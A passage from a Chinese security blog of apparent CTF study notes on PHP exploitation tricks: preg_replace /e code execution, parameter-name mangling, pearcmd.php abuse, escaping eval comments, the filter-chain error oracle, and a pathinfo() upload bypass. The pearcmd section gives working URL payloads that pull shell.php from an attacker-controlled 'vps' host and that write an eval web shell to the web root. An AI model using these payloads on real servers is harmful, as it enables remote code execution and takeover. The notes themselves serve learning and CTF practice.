<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $regex . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $value);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>本身这个payload是可以实现的，但是因为这是在GET传参，PHP在处理参数名的时候会将<code>.</code>换成下划线导致无法执行，当非法字符为首字母时，只有点号会被替换成下划线。</p>
<p>所以我们这里要做的就是让正则匹配能完全匹配到我们的<code>&#123;$&#123;phpinfo()&#125;&#125;</code>，这里师傅给出了一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们再解释一下为什么需要匹配到<code>&#123;$&#123;phpinfo()&#125;&#125;</code>才能执行里面的代码，这也是一个小点，其实就是可变变量的原因</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403162447924.png" alt="image-20250403162447924"></p>
<p>所以<strong>在双引号的包裹下，我们的字符串会检查并解析变量，而单引号不会</strong>，**${phpinfo()}** 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(phpinfo());</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">bool(true)</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>

<p>另外需要注意的是，<strong>在&#x2F;e模式下执行代码的时候会自动转义特殊字符</strong></p>
<h2 id="PHP中非法变量的解析"><a href="#PHP中非法变量的解析" class="headerlink" title="PHP中非法变量的解析"></a>PHP中非法变量的解析</h2><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250325112657901.png" alt="image-20250325112657901"></p>
<p>参数名中含有<code>空格</code>和<code>点</code>，可以看到当我们传入<code>?mo yu.=xxx</code>时，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，从而变成mo_yu_这样的参数名确实无法传参</p>
<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p>
<p>当php版本为8以上时便不会出现这种自动转换，所以直接传入变量名就行</p>
<h2 id="pearcmd-php的妙用"><a href="#pearcmd-php的妙用" class="headerlink" title="pearcmd.php的妙用"></a>pearcmd.php的妙用</h2><h3 id="1-register-argc-argv"><a href="#1-register-argc-argv" class="headerlink" title="1. register_argc_argv"></a>1. register_argc_argv</h3><p>如果环境中含有php.ini，则默认register_argc_argv&#x3D;Off；如果环境中没有php.ini，则默认register_argc_argv&#x3D;On</p>
<p>这个register_argc_argv能干什么呢？</p>
<p>我们先本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);<span class="comment">//以数组形式输出我们的命令行参数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//在 CLI 模式 下</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# php test.php </span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) &quot;test.php&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/# php test.php 1 2 3</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(8) &quot;test.php&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(1) &quot;3&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在web页模式下必须在php.ini开启register_argc_argv配置项<br>设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</p>
<p>然后我们如何利用呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>[<span class="number">0</span>](<span class="variable">$a</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不过这个在web下测试更方便，但是不知道为什么这里没测出来，所以直接在CLI下测了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# cat 1.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">$a = $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$a[1]($a[2]);</span><br><span class="line">?&gt;</span><br><span class="line">root@dkhkv28T7ijUp1amAVjh:/var/www/html# php 1.php system ls</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;1.php&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(6) &quot;system&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;ls&quot;</span><br><span class="line">&#125;</span><br><span class="line">1.php</span><br><span class="line">index.nginx-debian.html</span><br><span class="line">upload</span><br><span class="line">xss.php</span><br></pre></td></tr></table></figure>

<p>可以看到成功执行了</p>
<p>然后我们看pearcmd.php的神奇使用，最好的就是p牛的文章了</p>
<p>PEAR是为PHP扩展与应用库(PHP Extension and Application Repository)，它是一个PHP扩展及应用的一个代码仓库<br>类似于composer，用于代码的下载与管理。</p>
<p>pear可以用来拉取远程的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http://vps/shell.php</span><br></pre></td></tr></table></figure>

<p>该payload可以用来拉取我们vps上的shell.php文件并解析执行</p>
<h3 id="2-register-argc-argv和pear的关系"><a href="#2-register-argc-argv和pear的关系" class="headerlink" title="2.register_argc_argv和pear的关系"></a>2.register_argc_argv和pear的关系</h3><p><strong>当执行了pear后，会将$_SERVER[‘argv’]当作参数执行！如果存在文件包含漏洞的话，就可以包含pearcmd.php，拉取远程服务器上的文件到靶机，再通过文件包含获取shell。</strong></p>
<h3 id="3-payload"><a href="#3-payload" class="headerlink" title="3.payload"></a>3.payload</h3><p>如果靶机出网</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们尝试拉取远程服务器的shell.php到靶机的&#x2F;tmp目录下</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://vps/shell.php</span><br><span class="line">//shell就是我们的一句话木马</span><br></pre></td></tr></table></figure>

<p>然后文件包含shell.php同时传参cmd即可</p>
<p>解释payload</p>
<ul>
<li><strong><code>?file=/usr/local/lib/php/pearcmd.php</code></strong><ul>
<li>指定 <code>pearcmd.php</code> 文件的路径。</li>
<li><code>pearcmd.php</code> 是 PEAR（PHP 扩展和应用库）的命令行工具。</li>
</ul>
</li>
<li><strong><code>&amp;+install+-R+/tmp+http://vps/shell.php</code></strong><ul>
<li>这是 <code>pearcmd.php</code> 的 <code>install</code> 命令的参数。</li>
<li><code>install</code>：安装指定的包。</li>
<li><code>-R /tmp</code>：将安装的文件保存到 <code>/tmp</code> 目录。</li>
<li><code>http://vps/shell.php</code>：从远程服务器下载的恶意文件。</li>
</ul>
</li>
</ul>
<p>如果靶机不出网，我们可以写一句话木马进hello.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;shell&#x27;]);?&gt;+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>解释payload</p>
<ul>
<li><strong><code>?+config-create+</code></strong><ul>
<li>这是 PHP 的 <code>pearcmd.php</code> 工具的一个参数，用于创建配置文件。</li>
<li><code>pearcmd.php</code> 是 PEAR（PHP 扩展和应用库）的命令行工具。</li>
</ul>
</li>
<li><strong><code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/</code></strong><ul>
<li>指定 <code>pearcmd.php</code> 文件的路径。</li>
<li>如果服务器上存在 <code>pearcmd.php</code>，这段代码会尝试调用它。</li>
</ul>
</li>
<li><strong><code>&lt;?=eval($_POST[1])?&gt;</code></strong><ul>
<li>这是一个 PHP 短标签，用于执行 <code>eval($_POST[1])</code>。</li>
<li><code>eval</code> 函数会执行传入的 PHP 代码，<code>$_POST[1]</code> 是从 POST 请求中获取的参数。</li>
<li>这段代码的目的是将恶意 PHP 代码写入目标文件。</li>
</ul>
</li>
<li><strong><code>+/tmp/hello.php</code></strong><ul>
<li>指定目标文件的路径，即 <code>/tmp/hello.php</code>。</li>
<li>如果攻击成功，恶意代码会被写入该文件。</li>
</ul>
</li>
</ul>
<p>后来看了p牛的文章才知道$SERVER并不任务&amp;符号是参数的分隔符，而是将+号作为分隔符</p>
<h2 id="逃逸eval中注释符"><a href="#逃逸eval中注释符" class="headerlink" title="逃逸eval中注释符"></a>逃逸eval中注释符</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>. <span class="variable">$a</span> .<span class="string">&quot;2323&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>从eval中可以看到我们需要处理两个坑点</p>
<ul>
<li>前面的<code>#</code>注释符会把后面的代码注释掉</li>
<li>后面的2323是脏数据，需要处理掉</li>
</ul>
<p>后面的脏数据其实很好处理，我们在传入参数的结尾加上注释就可以，问题是如何绕过前面的注释符让我们的代码生效</p>
<p>我们可以用换行符(<code>\n</code>)</p>
<p>例如我们传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\necho &#x27;1&#x27;;#</span><br></pre></td></tr></table></figure>

<p>因为eval函数会把括号中的内容当成php代码去拼接在语句中。所以理论上如果我们传入换行符就会变成这样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#\n</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;<span class="comment">#2323</span></span><br></pre></td></tr></table></figure>

<p>此时成功逃逸注释，我们便可以传入想要传入的代码</p>
<p>但是需要注意的是</p>
<ul>
<li><p>注意# 是 URL 的锚点标识符，这里需要对#进行编码成%23，否则会被认为是URL本身的分隔符，</p>
</li>
<li><p>根据**<code>\n</code> 和 <code>\r</code> 在 HTTP 请求中的特殊作用**，如果 <code>\n</code> 不经编码直接传入 <code>?a=\n123</code>，服务器或浏览器可能会错误地认为 <code>\n</code> 是 <strong>HTTP 请求结束符</strong>，导致参数被截断。所以我们的<code>\n</code>也是需要编码成URL编码才能起作用的</p>
</li>
</ul>
<p>所以最终我们需要传入的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%0aecho &#x27;1&#x27;;%23</span><br></pre></td></tr></table></figure>

<h2 id="PHP-filter-chains的报错攻击"><a href="#PHP-filter-chains的报错攻击" class="headerlink" title="PHP filter chains的报错攻击"></a>PHP filter chains的报错攻击</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle</a></p>
<p>有朋友问到一个题目很有意思，是红明谷初赛2024的web中的ezphp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">hash_file</span>(<span class="string">&#x27;md5&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的话根据hash_file函数指定的散列算法md5去处理我们传入的文件名的文件内容，我们先关注一下这个函数</p>
<h3 id="hash-file函数"><a href="#hash-file函数" class="headerlink" title="hash_file函数"></a>hash_file函数</h3><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411150622351.png" alt="image-20250411150622351"></p>
<p>可以看到第一个参数就是指定的散列算法的类型，第二个就是文件名，这里提示有flag.php，我们传进去看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST：a=flag.php</span><br></pre></td></tr></table></figure>

<p>然后获得到这个文件的哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5fb6f40193d35a9353d6952f341c87e6</span><br></pre></td></tr></table></figure>

<p>然后这题其实是关于PHP filter chains的基于错误的 Oracle 读取文件，但是我们还是先了解一下这个PHP filter chains</p>
<h3 id="什么是PHP-filter-chains"><a href="#什么是PHP-filter-chains" class="headerlink" title="什么是PHP filter chains"></a>什么是PHP filter chains</h3><p><strong>PHP Filter Chains</strong> 是一种<strong>利用 PHP 内置的过滤器（Filter）功能构造过滤器链</strong>来执行代码或绕过安全限制的技术。例如我们平时用的php:&#x2F;&#x2F;filter伪协议，也是构造过滤器链。当 PHP 处理过滤器链时，恶意代码会被解码并执行。</p>
<p>当它被传递给易受攻击的函数（例如<code>file()</code>、<code>hash_file()</code>或）时，即使服务器没有返回文件内容，也可以用来泄露本地文件的内容</p>
<p>例如我们举个例子,在本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们看看file函数的官方解释</p>
<h3 id="file函数"><a href="#file函数" class="headerlink" title="file函数"></a>file函数</h3><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411161125698.png" alt="image-20250411161125698"></p>
<p>PHP的file函数读取一个文件，但不打印其文件的内容，这意味着服务器的响应中不会显示任何内容。</p>
<p>例如我web目录下有一个1.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//1.txt</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>然后我传入?c&#x3D;1.txt</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411161443151.png" alt="image-20250411161443151"></p>
<p>可以看到这里并没有返回文件的内容而是返回了数组</p>
<p>然后我们继续往下看</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>看看原文，然后再一句句翻译</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411161733120.png" alt="image-20250411161733120"></p>
<ul>
<li>使用iconv过滤器通过编码去增加数据大小来触发内存错误</li>
<li>使用dechunk过滤器根据上一个错误确定文件的第一个字符。</li>
<li>再次使用iconv过滤器，使用不同字节顺序的编码来交换剩余的字符。</li>
</ul>
<p>然后我们看一下iconv的作用</p>
<h4 id="利用iconv触发内存错误"><a href="#利用iconv触发内存错误" class="headerlink" title="利用iconv触发内存错误"></a>利用iconv触发内存错误</h4><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411162109606.png" alt="image-20250411162109606"></p>
<p>对于iconv函数来说，他能接收传递给它的字符串的编码，也可以直接从php:&#x2F;&#x2F;filter包装器调用，我们先本地测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;$string = &quot;START&quot;; echo strlen($string).&quot;\n&quot;;&#x27;</span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<p>在UTF8的编码下字符串START的长度为5个字节。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;$string = &quot;START&quot;; echo strlen(iconv(&quot;UTF8&quot;,&quot;UNICODE&quot;,$string)).&quot;\n&quot;;&#x27;</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p>为什么换成UNICODE编码就是12个字节呢？在 <code>iconv</code> 中，<code>UNICODE</code> 并不是一种标准的编码名称。<code>iconv</code> 将 <code>UNICODE</code> 解释为 <strong>UTF-16</strong> 编码，而字符串 <code>&quot;START&quot;</code> 包含 5 个字符，每个字符都是 ASCII 字符（码点范围：0-127）。在 UTF-16 编码中，每个 ASCII 字符使用 2 个字节表示。然后<code>iconv</code> 在转换时还会在输出的开头添加 <strong>BOM（Byte Order Mark）</strong>，用于标识字节序。BOM 在 UTF-16 中占用 2 个字节。</p>
<p>所以一共合起来是12个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;$string = &quot;START&quot;; echo strlen(iconv(&quot;UTF8&quot;, &quot;UCS-4&quot;, $string)).&quot;\n&quot;;&#x27;</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p><code>UCS-4</code> 是一种固定长度的 Unicode 编码方式，使用 <strong>4 个字节</strong> 表示每个字符。但是我们需要用到的是UCS-4LE而不是UCS-4，UCS-4LE的编码的字节序是默认固定的，而<code>UCS-4</code> 的字节序是 <strong>未明确指定的</strong>，通常由系统默认决定。</p>
<p>在PHP中，资源限制由php.ini的memory_limit参数定义。它的默认值是128MB。如果试图读取大于此大小的文件，则会引发错误</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250411164606166.png" alt="image-20250411164606166"></p>
<p>例如我们尝试对字符串进行多次编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;START&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">13</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF8&quot;</span>, <span class="string">&quot;UCS-4LE&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在内存中的操作是这样的</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/exponential_size_0.png" alt="exponential_size"></p>
<p>终端执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# php 2.php</span><br><span class="line">Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 83886144 bytes) in /var/www/html/2.php on line 6</span><br></pre></td></tr></table></figure>

<p>以上就是如何触发内存错误的学习讲解</p>
<h4 id="如何泄漏文件第1个字符"><a href="#如何泄漏文件第1个字符" class="headerlink" title="如何泄漏文件第1个字符"></a>如何泄漏文件第1个字符</h4><p>刚刚我们看到了如何触发这个错误，现在我们来看看如何转化成基于错误的 Oracle</p>
<p>Dechunk过滤器</p>
<p>这里其实是利用了php:&#x2F;&#x2F;filter包装器中的Dechunk方法，但是好像我在PHP文档中并没有搜查到</p>
<p>其目的是处理分块传输编码。后者将数据拆分为2个以CRLF结尾的行的块，第一个行定义块长度。</p>
<p>我们跟着文章试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# echo &quot;START&quot; &gt; /tmp/test</span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;echo file_get_contents(&quot;php://filter/dechunk/resource=/tmp/test&quot;);&#x27;</span><br><span class="line">START</span><br><span class="line">root@VM-16-12-ubuntu:/# echo &quot;123456&quot; &gt; /tmp/test</span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;echo file_get_contents(&quot;php://filter/dechunk/resource=/tmp/test&quot;);&#x27;</span><br><span class="line">root@VM-16-12-ubuntu:/# echo &quot;ATART&quot; &gt; /tmp/test</span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;echo file_get_contents(&quot;php://filter/dechunk/resource=/tmp/test&quot;);&#x27;</span><br><span class="line">root@VM-16-12-ubuntu:/# echo &quot;0TART&quot; &gt; /tmp/test</span><br><span class="line">root@VM-16-12-ubuntu:/# php -r &#x27;echo file_get_contents(&quot;php://filter/dechunk/resource=/tmp/test&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>文章解释的是，当第一个字符是十六进制值（[0-9]，[a-f]，[A-F]）时，文件内容在通过dechunk过滤器时被丢弃。这是因为如果十六进制长度后面没有CRLF，解析将失败。</p>
<p>因此，如果第一个字符是十六进制值，输出将为空，否则完整的链不会改变，并且会触发memory_limit错误，从而完成我们的oracle。</p>
<p>然后我们将以上两种技巧联合起来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$size_bomb</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">13</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$size_bomb</span> .= <span class="string">&quot;convert.iconv.UTF8.UCS-4|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;php://filter/dechunk|<span class="subst">$size_bomb</span>/resource=/tmp/test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure>

<p>这里的话构造了一个过滤器链，拼接**<code>convert.iconv.UTF8.UCS-4</code> 过滤器**，最终过滤器链的内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/dechunk|convert.iconv.UTF8.UCS-4|convert.iconv.UTF8.UCS-4|...|convert.iconv.UTF8.UCS-4/resource=/tmp/test</span><br></pre></td></tr></table></figure>

<p>然后在<code>echo file_get_contents($filter);</code>中，会进行文件读取并应用该过滤器链，此时会出现两种结果</p>
<ul>
<li>如果第一个字符是在十六进制值的范围中，那么该内容通过dechunk的时候就会被丢弃，也就不会报错</li>
<li>如果第一个字符不是在十六进制值的范围中，那么该过滤器链就会完整应用，并且触发memory_limit错误</li>
</ul>
<p>先学到这吧，实在是太难琢磨了那篇文章</p>
<h2 id="pathinfo-函数绕过"><a href="#pathinfo-函数绕过" class="headerlink" title="pathinfo()函数绕过"></a>pathinfo()函数绕过</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/YYYYU_ZHIZZZ/article/details/134287200">文件上传upload-labs 第20关 pathinfo()函数</a></p>
<p>这个通常出现在我们上传文件的时候的一种绕过，先来看看pathinfo()函数</p>
<h3 id="pathinfo-函数"><a href="#pathinfo-函数" class="headerlink" title="pathinfo()函数"></a>pathinfo()函数</h3><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250416190255404.png" alt="image-20250416190255404"></p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250416190432393.png" alt="image-20250416190432393"></p>
<p>pathinfo函数用于获取文件或目录的路径信息。它接受一个文件或目录的路径作为输入，并返回一个关联数组，其中包含有关路径的信息，例如 **<code>PATHINFO_DIRNAME</code>**、 **<code>PATHINFO_BASENAME</code>**、 **<code>PATHINFO_EXTENSION</code>**、 **<code>PATHINFO_FILENAME</code>**。</p>
<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250416190513189.png" alt="image-20250416190513189"></p>
<p>需要注意一个很重要的点：</p>
<p> PATHINFO_EXTENSION常量表示识别任何有效的拓展名，<strong>如果拓展名有斜杠 &#x2F; 或者 \ 就忽略，返回文件名最后一个点号后面的字符串作为拓展名。如果遇到最后一个点号后面没有拓展名或者拓展名无效就返回为空</strong>。</p>
